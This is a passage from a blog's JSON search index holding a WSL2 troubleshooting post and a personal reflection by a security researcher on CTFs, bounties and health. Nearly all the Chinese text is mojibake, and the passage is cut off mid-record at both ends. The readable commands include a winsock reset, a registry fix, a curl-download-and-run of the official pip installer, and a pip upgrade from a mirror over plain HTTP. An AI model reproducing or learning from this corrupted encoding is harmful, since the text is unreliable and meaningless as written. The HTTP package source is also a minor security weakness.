","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:2","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2è¸©å‘ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"1. å‚è€ƒçš„å¯¹è±¡ç±»å‹ä¸æ”¯æŒå°è¯•çš„æ“ä½œ å¯¹åº”çš„è‹±æ–‡ä¿¡æ¯æ˜¯ï¼šThe attempted operation is not supported for the type of object referenced.ï¼Œæœ‰å¾ˆå¤§å¯èƒ½åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œå®‰è£…çš„Linuxçš„æ—¶å€™å°±å‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œä¸è§£å†³çš„è¯ç”¨æˆ·åˆ›å»ºä¸äº†ï¼Œç³»ç»Ÿè¿›ä¸å»ã€‚ Solution ä¹‹å‰ä»æ¥æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§é—®é¢˜ï¼ŒMicrosoft å®˜æ–¹æ–‡æ¡£ä¹Ÿæ²¡æœ‰çœ‹åˆ°å¯¹åº”çš„é—®é¢˜å’Œ Solutionï¼Œåæ¥å»çœ‹äº†WSLçš„issueï¼Œå‘ç°äº†ä¸€ä¸ªç›¸å…³çš„issueï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯è·ŸVPNæœ‰å…³ã€‚ å¦‚æœä½ çš„ç”µè„‘ä¸Šå®‰è£…äº†VPNè½¯ä»¶ï¼Œå¯èƒ½ä¼šä¿®æ”¹ä¸»æœºæ“ä½œç³»ç»Ÿçš„VPNç›¸å…³çš„è®¾ç½®ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä¸´æ—¶çš„ï¼šæ‰§è¡Œä¸€ä¸‹ netsh winsock reset å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯æœ‰å¯èƒ½åœ¨é‡å¯ç³»ç»Ÿåå°±å¤±æ•ˆï¼›ä¸€ç§æ˜¯éä¸´æ—¶çš„ï¼Œéœ€è¦åœ¨æ³¨å†Œè¡¨æ–°å¢ä¸€ä¸ªé¡¹ï¼Œè¿™ç§åœ¨é‡å¯ä¸»æœºç³»ç»Ÿåè¿˜ä¼šæœ‰æ•ˆï¼š Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\AppId_Catalog\\0408F7A3] \"AppFullPath\"=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\wsl.exe\" \"PermittedLspCategories\"=dword:80000000 æŠŠä¸Šé¢çš„å†…å®¹ä¿å­˜æˆä¸€ä¸ª reg æ–‡ä»¶ï¼Œç„¶åç®¡ç†å‘˜è¿è¡Œå³å¯æ–°å¢å¯¹åº”æ³¨å†Œè¡¨é¡¹ã€‚ è¿™ä¸ªé—®é¢˜ä»Windows 10çš„æ—¶å€™å°±å­˜åœ¨ï¼Œä½†æ˜¯ç›´åˆ°Windows 11çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè¿˜æ²¡æœ‰è§£å†³ã€‚è™½ç„¶ç½‘ä¸Šæœ‰äº†ç»è¿‡éªŒè¯çš„æœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯å¾®è½¯å®˜æ–¹å§‹ç»ˆæ²¡æœ‰è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘æ„Ÿè§‰WSLçš„å¼€å‘è€…åº”è¯¥æ˜¯æœ‰å¿ƒæ— åŠ›ï¼Œæ¯•ç«ŸWSLçš„å®šä½åº”è¯¥è¿˜åªæ˜¯ä¸€ä¸ªåº”ç”¨çº§åˆ«çš„è½¯ä»¶ï¼Œè€Œä¸åƒWindowsç³»ç»Ÿä¸­VPNç»„ä»¶è¿™ä¹ˆæ ¸å¿ƒã€‚å› ä¸ºç›®å‰è¿™ä¸ªé—®é¢˜çš„å‡ºç°å¤§æ¦‚ç‡è·ŸVPNæ¨¡å—æœ‰å…³ï¼Œå¦‚æœè¦ä¿®å¤ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šæ¶‰åŠåˆ°VPNæ¨¡å—å’Œç½‘ç»œæ¨¡å—ï¼Œé‚£å°±ä¸æ˜¯WSLçš„å¼€å‘è€…è‡ªå·±èƒ½æå¾—å®šçš„äº†ã€‚ å¯¹äº†ï¼Œè§£å†³æ–¹æ¡ˆé‡Œè¿˜æœ‰ä¸€ä¸ªä»€ä¹ˆå·¥å…·å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè¿˜æ˜¯å»ºè®®èƒ½ä¸ç”¨å·¥å…·å°±ä¸ç”¨å·¥å…·ï¼Œç›´æ¥å†™ä¸ªæ³¨å†Œè¡¨ä¹Ÿä¸æ˜¯å¾ˆéº»çƒ¦ã€‚ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:1","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"2. pipå®‰è£…è¶…æ—¶ å‰é¢æœ‰è¯´æˆ‘æ˜¯å®‰è£…è¿‡20ç‰ˆæœ¬çš„Ubuntuçš„ï¼Œå½“æ—¶æƒ³è£…ä¸€ä¸ªpython 3.10å’Œå¯¹åº”çš„pipï¼Œä½†æ˜¯é‡åˆ°äº†pipå®‰è£…ä¸ä¸Šçš„é—®é¢˜ï¼Œå…¶å®å‘½ä»¤å¾ˆç®€å•ï¼š curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python3 get-pip.py ä½†æ˜¯åœ¨æ‰§è¡Œåé¢çš„pyæ–‡ä»¶çš„æ—¶å€™ï¼Œé¦–å…ˆæ˜¯ç½‘ç»œè¿æ¥æ…¢ï¼Œå¯ä»¥ç†è§£ï¼Œæ¯•ç«Ÿpypiä»–ä»¬ä¹‹å‰å°±å‡ºç°è¿‡ç½‘ç»œé—®é¢˜ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æœ€å¥½æ˜¯å¼€ä»£ç†ã€‚ç„¶åï¼Œæˆ‘ä½¿ç”¨sudoå‘½ä»¤å»æ‰§è¡Œäº†ç¬¬äºŒä¸ªå‘½ä»¤ï¼Œå‘ç°è¿˜æ˜¯ä¹ˆæœ‰ç½‘é€Ÿï¼Œæ­»æ´»ä¸‹è½½ä¸ä¸‹æ¥é‚£ä¸ª2.1Mçš„æ–‡ä»¶ã€‚æœ€åï¼Œå»æ‰äº†sudoï¼Œç§’å®‰è£…-ã€‚-ã€‚è¿™ä¸ªæ€ªæˆ‘è‡ªå·±ã€‚ç„¶åï¼Œåœ¨æ›´æ–°çš„æ—¶å€™ï¼š python3 -m pip install --upgrade pip è¿™ä¸ªæ—¶å€™æˆ‘å·²ç»è®¾ç½®äº†é»˜è®¤pythonä¸ºæ–°è£…çš„python3.10ï¼Œåˆé‡åˆ°äº†ç½‘ç»œé—®é¢˜ï¼Œæ›´æ–°ä¸äº†ï¼Œå¼€ä»£ç†ä¹Ÿæ²¡æœ‰ç”¨ã€‚ æœ€åï¼Œå¦¥åäº†ï¼Œç”¨çš„å›½å†…çš„æº-ã€‚-ï¼š python3 -m pip install --upgrade pip -i http://mirrors.aliyun.com/pypi/simple/ åˆ°è¿™é‡ŒåŸºæœ¬è§£å†³äº†python3.10å’Œpipçš„é—®é¢˜ï¼Œä½†æ˜¯åœ¨åé¢å®‰è£…æˆ‘çš„é‚£ä¸ªå·¥å…·çš„æ—¶å€™ï¼Œå‘ç°å®ƒè¿˜æ˜¯ä¼šé»˜è®¤ä½¿ç”¨ç³»ç»Ÿçš„python3.8ï¼Œè€Œä¸”åœ¨aptçš„æ—¶å€™ï¼Œä¸‹è½½çš„ä¹Ÿæ˜¯python3.8çš„ä¾èµ–ã€‚è¿™ä¸ªæ—¶å€™æˆ‘å·²ç»å¿ƒæ€çˆ†ç‚¸ï¼Œæ‡’å¾—å»å¼„äº†ï¼Œæ‰€ä»¥åé¢æ¢äº†22ç‰ˆæœ¬çš„Ubuntuã€‚ å…¶å®pythonå¤šç‰ˆæœ¬çš„é—®é¢˜ç›´æ¥ç”¨pyenvå°±å¯ä»¥è§£å†³ï¼Œä½†å°±æ˜¯å¤´é“ï¼Œä¸æƒ³è£…è¿™ä¹ˆå¤šä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œå¥”ç€æ­»æ´»ä¸ç”¨å°±æƒ³å»è§£å†³é—®é¢˜çš„æ€åº¦ï¼Œæˆ‘æ¢äº†ç³»ç»Ÿç‰ˆæœ¬ã€‚ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:5:2","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Life"],"content":"æ—¥å¸¸","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"çèŠï¼Œå…±å‹‰ï¼Œæ²¡æœ‰ä¸»é¢˜ã€‚ å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:0:0","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"ä»…ä¾›å‚è€ƒ ä¹‹å‰æœ‰åœ¨Bç«™ä¸Šç®€å•å½•åˆ¶è¿‡å‡ ä¸ªè§†é¢‘ï¼Œå½“æ—¶ä¸»è¦æ˜¯ç»™æˆ‘æ¯æ ¡å’Œå®éªŒå®¤çš„å­¦å¼Ÿå­¦å¦¹ä»¬çœ‹çš„ï¼Œç»“æœä»–ä»¬åˆç»™è‡ªå·±çš„æœ‹å‹è¯´äº†ï¼Œç„¶åé—®æˆ‘çš„äººå°±å¤šäº†èµ·æ¥ï¼Œæ‰€ä»¥åæ¥åˆå‡ºäº†è§†é¢‘ã€‚ å…¶å®æ¯æ¬¡å½•å®Œè§†é¢‘ï¼Œæˆ‘éƒ½è§‰å¾—æ²¡æœ‰æ„ä¹‰ã€‚ä»æˆ‘çš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘èƒ½ç»™å¤§å®¶æä¾›çš„ä¿¡æ¯æ˜¯æˆ‘æ‰€çœ‹åˆ°çš„å…³äºè¡Œä¸šçš„ä¸€å°éƒ¨åˆ†çš„çŠ¶å†µä»¥åŠæˆ‘çš„ä¸€äº›å­¦ä¹ ç»å†ã€‚ä½†æ˜¯æˆ‘æ˜¯å±äºæ¯”è¾ƒä¼ ç»Ÿçš„ç§‘ç­å‡ºèº«ï¼Œè€Œä¸”æœ¬ç§‘æ²¡æœ‰æ¥è§¦ï¼Œæ˜¯åœ¨ç ”ç©¶ç”Ÿé˜¶æ®µæ¥è§¦åˆ°ã€‚æ‰€ä»¥æˆ‘çš„ä¸€äº›å­¦ä¹ è·¯å¾„å’Œæ–¹æ³•å¯èƒ½ä¸å¤§éƒ¨åˆ†çš„æœ¬ç§‘ç”Ÿä¸å¤ªä¸€æ ·ï¼Œæ›´ä¸è¦è¯´å¯¹äºé‚£äº›ä»é«˜ä¸­å°±å¼€å§‹æ¥è§¦å®‰å…¨çš„äº†ã€‚ æˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢ç»™åˆ«äººå»ºè®®çš„ï¼Œå°±åƒDeftè¯´çš„ï¼Œæ¯ä¸ªäººè¦ä¸è¦åšä¸€ä»¶äº‹ï¼Œå…¶å®æ˜¯ä¸å¤ªéœ€è¦åˆ«äººçš„å»ºè®®çš„ï¼Œå› ä¸ºæ¯ä¸ªäººçš„ç»å†ä¸åŒï¼Œæ²¡æœ‰åŠæ³•å»æ„ŸåŒèº«å—ã€‚ä½†æ˜¯å‘¢ï¼Œå½“åˆ«äººå’¨è¯¢ä½ ï¼Œä½ ä¸ç­”å¤ç‚¹ä»€ä¹ˆçš„è¯ï¼Œåˆä¼šè¢«åˆ«äººè¯¯è§£æˆä½ ä¸æƒ³ç­”ã€è—ç€æ–ç€ã€å°å®¶å­æ°”ã€è£…æ¸…é«˜ä»€ä¹ˆçš„ã€‚æˆ‘è§‰å¾—æˆ‘å·²ç»ç®—æ˜¯æ¯”è¾ƒä¸åœ¨æ„åˆ«äººçœ‹æ³•çš„é‚£ç§ç±»å‹äº†ï¼Œä½†æ˜¯æœ‰äººçš„åœ°æ–¹å°±æœ‰æ±Ÿæ¹–å˜›ï¼Œæ±Ÿæ¹–æ˜¯ä»€ä¹ˆï¼Ÿäººæƒ…ä¸–æ•…å•Šï¼Œä¸å¾—ä¸ä½å¤´ã€‚æ‰€ä»¥ï¼Œå°±ç´¢æ€§å½•äº†è§†é¢‘å»ç»Ÿä¸€ç­”å¤ã€‚ æœ€ç‹—è¡€çš„æ˜¯ï¼Œæˆ‘è§†é¢‘é‡Œå·²ç»åå¤å¼ºè°ƒäº†æ¯ä¸ªäººçš„æƒ…å†µä¸åŒï¼Œè¦ç»“åˆå…·ä½“å®é™…ï¼Œè¿˜æ˜¯æœ‰äººè¿‡æ¥yygqä½ ï¼Œè§‰å¾—ä½ å‡ºæ¥zbï¼Œæˆ‘çœŸæ˜¯æœäº†:)ä¸è¿‡è¿™ç§å€’æ˜¯æ— æ‰€è°“ï¼Œæˆ‘å¯¹è¿™ä¸€ç±»çš„ä¿¡æ¯åŸºæœ¬ä¸careï¼Œå¯¹æˆ‘é€ ä¸æˆä»€ä¹ˆå½±å“ã€‚ è§†é¢‘æ’­æ”¾ä¸å¤šï¼Œä½†æ˜¯å¤šå¤šå°‘å°‘è¿˜æ˜¯å¯¹ä¸€äº›äººäº§ç”Ÿäº†ä¸€ä¸ç‚¹çš„å‚è€ƒä½œç”¨ã€‚ä½†æ˜¯å‡ºç°äº†å¦å¤–ä¸€ç§æƒ…å†µï¼Œç§ä¿¡æˆ‘çš„äººè¶Šæ¥è¶Šå¤šï¼Œæˆ‘åˆæ˜¯ä¸ªä¸å¤ªæƒ³è¾œè´Ÿåˆ«äººçš„äººï¼Œæ‰€ä»¥å°±æ¯æ¡éƒ½å›å¤ã€‚æˆ‘ä¸è§‰å¾—æµªè´¹æ—¶é—´ï¼Œåªæ˜¯æœ‰äº›é—®é¢˜é—®çš„æœ‰ç‚¹ä¸æ¸…ä¸æ¥šï¼Œæˆ‘è¦æ…¢æ…¢å»å¼•å¯¼å‡ºä»–ä»¬æƒ³é—®çš„å†…å®¹ã€‚è¶Šæ˜¯å¯¹äºè¿™ç§åŒå­¦ï¼Œæˆ‘è¶Šæ˜¯è°¨æ…ï¼Œå› ä¸ºä½ çŸ¥é“çš„è¶Šå°‘ï¼Œé—®é¢˜è¶Šæ¨¡ç³Šã€‚ä»–æè¿°ä¸æ¸…æ¥šï¼Œä½ ç†è§£é”™è¯¯ç»™å‡ºäº†å»ºè®®ï¼Œå¦‚æœä»–çœŸçš„å¾ˆä¿¡ä»»ä½ ï¼Œé‚£ä½ å°±ä¼šç»™åˆ«äººå¸¦æ¥éº»çƒ¦äº†ï¼ˆåˆ«æ€€ç–‘ï¼ŒçœŸçš„ä¼šæœ‰äººå®Œå…¨ç›¸ä¿¡ç½‘ç»œä¸Šçš„å›ç­”ï¼‰ã€‚æ‰€ä»¥æˆ‘æ¯ä¸ªç­”å¤æœ€åéƒ½ä¼šè¯´ï¼Œä»…ä¾›å‚è€ƒã€‚ æ‰€ä»¥ç›´åˆ°ç°åœ¨ï¼Œæˆ‘å‘ç°ç»™åˆ«äººåšå’¨è¯¢è¿™ä¸ªäº‹æƒ…æ˜¯ä¸€ä¸ªå…¥äº†å°±å‡ºä¸æ¥çš„äº‹æƒ…ï¼Œå€’ä¸æ˜¯å› ä¸ºéº»çƒ¦ï¼Œè€Œæ˜¯ä½ å¦‚æœçœŸçš„å¯¹åˆ«äººè´Ÿè´£çš„è¯ï¼Œä½ ä¼šå‘ç°äº‹æƒ…è¿œæ¯”ä½ ä¸€å¼€å§‹æƒ³çš„å¤æ‚çš„å¤šã€‚ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:1:0","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"é‡‘é’±æ¬²æœ› ç½‘å®‰æ˜¯ä¸ªå¾ˆæŒ£é’±çš„è¡Œä¸šï¼Œå¦‚æœä½ ä¸çŸ¥é“ä¸ºä»€ä¹ˆæŒ£é’±ï¼Œé‚£è¯´æ˜ä½ è¿˜æ²¡äº†è§£é€å½»ï¼ˆæˆ‘ä¸æ˜¯è¯´å·¥èµ„é«˜ï¼‰ã€‚å‰æ®µæ—¶é—´è·Ÿæœ‹å‹åƒé¥­çš„æ—¶å€™ï¼Œå…¨ç¨‹èŠçš„éƒ½æ˜¯Bountyã€å¥–é‡‘å’Œå¤–å¿«ã€‚æˆ‘å€’ä¸æ˜¯è¯´ä¸å–œæ¬¢è®¨è®ºè¿™äº›ä¸œè¥¿ï¼Œè€Œæ˜¯æˆ‘é€æ¸å‘ç°ï¼Œä»–ä»¬æ…¢æ…¢åœ°æŠŠè‡ªå·±çš„å…´è¶£ä»æŠ€æœ¯æœ¬èº«è½¬ç§»åˆ°ä»Moneyå‡ºå‘å»ææŠ€æœ¯ã€‚ï¼ˆæˆ‘æ‰“èµŒï¼Œè‡³å°‘æœ‰80%çš„äººçœ‹åˆ°è¿™éƒ½ä¼šè§‰å¾—ï¼Œå“å‘€ï¼Œä½ è£…ä»€ä¹ˆæ¸…é«˜å•Šï¼Œè°ä¸æ˜¯ä¸ºäº†é’±ã€‚Fineï¼Œéšä½ æ€ä¹ˆæƒ³å“ˆã€‚å¦‚æœä½ è¿™ä¹ˆæƒ³å‘¢ï¼Œå°±åˆ«å¾€ä¸‹çœ‹äº†ï¼Œæ€•æ°”åˆ°ä½ ï¼Œæ€ªä¸å¥½çš„ã€‚ï¼‰ æˆ‘ä¸æ˜¯å¦è®¤ä¸ºäº†é’±å»ææŠ€æœ¯ï¼Œå› ä¸ºè¿™å‡ ä¸ªäººä¸ç®¡å‡ºäºä»€ä¹ˆå‡ºå‘ç‚¹ï¼ŒæŠ€æœ¯ä¾§éƒ½æ˜¯é‚£ç§è¡Œä¸šé¢†å¤´çš„çº§åˆ«ï¼ˆæ˜¯çœŸçš„é¢†å¤´çš„é‚£ç§ï¼Œä¸æ˜¯é åŒ…è£…å’Œppté¢†å¤´çš„ï¼‰ã€‚æˆ‘æ¯”è¾ƒçº³é—·çš„æ˜¯ï¼Œä¸ºä»€ä¹ˆä»–ä»¬ä¼šæœ‰è¿™ç§è½¬å˜ã€‚ååŠç¨‹æˆ‘å°±é—®ä»–ä»¬ï¼Œä½ ä»¬ç°åœ¨æ¯”èµ›å’ŒæŒ–æ´éƒ½æ˜¯å…ˆè€ƒè™‘Bountyå—ï¼Ÿä»–ä»¬éƒ½æ„£äº†ä¸€ä¸‹ï¼Œç„¶åç¬‘ç€è¯´è‚¯å®šå•Šï¼Œè°ä¸æ˜¯ä¸ºäº†é’±ã€‚æˆ‘æ˜ç™½ï¼Œå¦‚æœä»–ä»¬ä¸æ„£é‚£ä¸€ä¸‹ï¼Œæˆ‘è¿˜çœŸä¿¡äº†ã€‚æˆ‘æ„Ÿè§‰å§ï¼Œä»–ä»¬è‡ªå·±éƒ½æ²¡æœ‰è§‰å¾—è‡ªå·±ç°åœ¨ä¼˜å…ˆè€ƒè™‘çš„æ˜¯é’±ï¼ˆå› ä¸ºä»–ä»¬æ¯ä¸ªäººå®¶åº­æ¡ä»¶éƒ½å¾ˆå¥½ï¼Œéƒ½ä¸ç¼ºé’±ã€‚åˆ°è¿™ï¼Œå°±ä¼šå†æœ‰15%çš„äººè¯´äº†ï¼Œè°ä¼šå«Œé’±å¤šå•Šï¼‰ã€‚ çœŸçš„å¾ˆæ€€å¿µé€šå®µæ‰“é‚£ç§å¥–é‡‘åªæœ‰å‡ ç™¾å—çš„CTFçš„æ—¥å­ï¼Œä¸ä¸ºé’±ï¼Œå°±ä¸ºflagã€‚ä½†æ˜¯ç°åœ¨ï¼Œè¿™ç§æƒ³æ³•å·²ç»è·Ÿâ€œä¸»æµæ„è¯†â€æ ¼æ ¼ä¸å…¥äº†ï¼Œä¼šè¢«äººè§‰å¾—è ¢ã€å‚»ã€ç¬¨ã€‚æ— æ‰€è°“äº†ï¼Œè¿˜æ˜¯é¡¾ç€è‡ªå·±å¿ƒæƒ…æœ€é‡è¦ã€‚ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:2:0","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"èº«ä½“å¥åº· ä¸çŸ¥é“æ˜¯å› ä¸ºå¹´é¾„é€æ¸å¢é•¿è¿˜æ˜¯æ€ä¹ˆï¼Œè¶Šæ¥è¶Šè§‰å¾—èº«ä½“å¥åº·æœ€é‡è¦ã€‚å¦‚æœæˆ‘æ®‹ç–¾äº†ï¼Œèµ°ä¸äº†è·¯ï¼Œä½†æ˜¯åˆä¸ªåŠ³æ–¯è±æ–¯å¤©å¤©å¸¦ç€æˆ‘å‡ºé—¨ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯å¥å¥åº·åº·ï¼Œå¤©å¤©åªèƒ½æŒ¤å…¬äº¤ï¼Œè®©æˆ‘é€‰æ‹©çš„è¯ï¼Œæˆ‘çœŸçš„ä¼šé€‰æ‹©åè€…ã€‚è¿™å¯èƒ½æ˜¯åŸºäºå‰é¢é‚£ä¸ªâ€œé‡‘é’±æ¬²æœ›â€çš„åŸå› ï¼Œ æˆ‘å¯¹é’±æ²¡æœ‰é‚£ä¹ˆå……è£•çš„æ¬²æœ›ï¼Œæ›´å¤šçš„æ˜¯å…³æ³¨è‡ªå·±å¼€ä¸å¼€å¿ƒï¼ˆå¯èƒ½è¿˜æ²¡æœ‰é‡åˆ°è¿‡é‚£ç§å› ä¸ºé’±å¯¼è‡´ä¸å¼€å¿ƒçš„äº‹æƒ…å§ï¼Œæˆ–è®¸å¦‚æœæœ‰ä¸€åœºå‡ ç™¾ä¸‡è´¹ç”¨çš„äº‹æ•…çš„è¯ï¼Œä¼šæ”¹å˜ä¸€ä¸‹ï¼‰ã€‚ æ¯å¤©çœ‹å…¨çƒçš„æ–°é—»ï¼Œä¿¡æ¯é‡çˆ†ç‚¸çš„æƒ…å†µä¸‹ï¼Œæˆ‘æ›´å¤šçš„çœ‹çš„æ˜¯å…¨çƒå„åœ°ä¸åŒçš„ç”Ÿå­˜æ–¹å¼ã€‚æ˜¯ç”Ÿå­˜æ–¹å¼ï¼Œä¸æ˜¯ç”Ÿæ´»ã€‚è¿™ä¹Ÿæ˜¯å¸¦æ¥ä¸åŒä»·å€¼è§‚çš„æ ¹å› å§ã€‚ ä½ æ°¸è¿œä¸çŸ¥é“æ˜å¤©ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œæ‰€ä»¥èƒ½å¿«ä¹å¥åº·åœ°è¿‡ä¸€å¤©ï¼Œæ¯”ä»€ä¹ˆéƒ½å€¼å¾—ã€‚ç°åœ¨æˆ‘å°±è¿™ä¹ˆæƒ³ã€‚ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:3:0","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"æ€»ç»“ æ´—æŠŠè„¸ï¼Œè¯¥åšé¥­äº†ï¼Œå«å¥³æœ‹å‹èµ·åºŠï¼Œè¿‡ä¸€ä¸ªæ„‰å¿«çš„ä¸€å¤©å§ï½ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:4:0","tags":["Life"],"title":"å…³äºæˆ‘åœ¨è¿™ä¸ªå‘¨æœ«æ—©ä¸Šç¡ä¸ç€èµ·æ¥æƒ³çš„è¿™äº›äº‹","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["IoT"],"content":"Netgear 